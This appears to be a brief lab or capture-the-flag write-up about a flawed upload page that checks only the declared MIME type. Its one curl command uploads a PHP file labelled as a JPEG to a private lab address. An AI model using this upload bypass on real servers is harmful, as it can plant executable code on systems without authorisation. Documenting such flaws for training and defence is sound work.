On: /?page=upload

The file input only accepts Mime Type "image/jpeg" but doesn't check the actual type of the file

To tamper the file type: ```curl -F "uploaded=@hello.php;type=image/jpg" --form "MAX_FILE_SIZE=10000" --form "Upload=Upload" "http://10.11.200.135/?page=upload"```
